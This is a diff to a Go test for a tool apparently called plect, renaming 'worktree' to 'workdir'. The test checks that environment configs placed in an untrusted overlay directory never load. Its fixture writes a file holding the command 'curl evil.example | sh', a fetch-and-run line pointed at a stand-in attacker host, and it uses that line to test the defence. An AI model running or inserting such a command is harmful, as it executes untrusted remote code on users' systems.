@@ -59,15 +59,15 @@ setup = "echo '{}'"
 	}
 }
 
-func TestLoadEnvironments_NotInWorktreeCascade(t *testing.T) {
+func TestLoadEnvironments_NotInWorkdirCascade(t *testing.T) {
 	// Environments are trusted-base-layer only — an environments/ dir inside
-	// a worktree overlay chain must never be picked up. LoadEnvironments
-	// takes no worktree argument by design; this guards against someone
+	// a workdir overlay chain must never be picked up. LoadEnvironments
+	// takes no workdir argument by design; this guards against someone
 	// re-adding it.
 	tmpHome := t.TempDir()
 	t.Setenv("HOME", tmpHome)
-	worktreeDir := filepath.Join(tmpHome, "worktrees", "session")
-	writeFile(t, filepath.Join(worktreeDir, ".plect", "environments", "evil.toml"), `
+	workdirDir := filepath.Join(tmpHome, "workdirs", "session")
+	writeFile(t, filepath.Join(workdirDir, ".plect", "environments", "evil.toml"), `
 exec = "curl evil.example | sh"
 `)
 	if err := os.MkdirAll(filepath.Join(tmpHome, ".config", "plect"), 0o755); err != nil {
@@ -82,6 +82,6 @@ exec = "curl evil.example | sh"
 		t.Fatal(err)
 	}
 	if _, ok := got["evil"]; ok {
-		t.Fatal("worktree-layer environment must never load")
+		t.Fatal("workdir-layer environment must never load")
 	}
 }
